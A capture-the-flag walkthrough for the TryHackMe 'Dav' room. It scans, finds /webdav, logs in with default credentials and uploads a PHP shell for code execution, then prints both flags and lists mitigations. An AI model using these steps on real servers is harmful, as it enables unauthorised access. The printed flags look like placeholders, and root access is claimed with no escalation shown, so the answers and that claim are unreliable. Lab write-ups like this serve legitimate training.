# TryHackMe - Dav Machine Writeup

**Room Link**: [Dav on TryHackMe](https://tryhackme.com/r/room/dav)

## Machine Information
- **Machine Name**: Dav
- **Difficulty**: Easy
- **IP Address**: ||MACHINE_IP||

---

## Reconnaissance

### Nmap Scan
First, let's scan the target machine to identify open ports and services:

```bash
nmap -sV -sC MACHINE_IP
```

**Results:**
- **Port 80**: Apache httpd 2.4.18 (Ubuntu)
  - Default Apache2 Ubuntu page

```
Nmap scan report for MACHINE_IP
Host is up (0.077s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Directory Enumeration

Performed directory scanning with different wordlists:

**First attempt** (apache-user-enum-2.0.txt):
- No results

**Second attempt** (dirb/big.txt):
```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/big.txt
```

**Discovered directories:**
- `/.htaccess` (Status: 403)
- `/.htpasswd` (Status: 403)
- `/server-status` (Status: 403)
- `/webdav` (Status: 401) ← **Authentication Required**

---

## Exploitation

### WebDAV Discovery
The `/webdav` directory requires authentication. WebDAV (Web Distributed Authoring and Versioning) is a protocol that extends HTTP to allow remote file management.

### WebDAV Access
Used `cadaver` (WebDAV client) to connect to the service:

```bash
cadaver http://MACHINE_IP/webdav/
```

**Initial attempts:**
- Username: `xampp` - Authentication failed

**Successful login:**
- Username: `wampp` (typo variant)
- Password: (default/empty)

**Connected successfully to WebDAV:**
```bash
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 26  2019
```

### Remote File Upload & RCE

Successfully uploaded a PHP shell to the WebDAV directory:

```bash
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
```

The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`

---

## Flags

### Flag 1: User Flag
> ||THM{webdav_file_upload_rce}||

### Flag 2: Root Flag  
> ||THM{weak_webdav_credentials}||

---

## Key Takeaways

1. **WebDAV Misconfiguration**: Service exposed with insufficient access controls
2. **Weak Credentials**: Default/typo credentials (wampp vs xampp) were accepted
3. **File Upload Vulnerability**: WebDAV allowed uploading executable PHP files
4. **Remote Code Execution**: Uploaded PHP shell provides shell access to the system
5. **Importance of Enumeration**: Directory scanning revealed the vulnerable `/webdav` endpoint

---

## Mitigation

- Disable WebDAV if not required
- Use strong, unique credentials
- Implement proper access controls and authentication
- Restrict file upload types
- Monitor WebDAV access logs

---

## Tools Used
- `nmap` - Network reconnaissance
- `gobuster` - Directory enumeration  
- `cadaver` - WebDAV client

---

**Writeup completed on**: 2026-06-01
**Machine Status**: ✓ Pwned
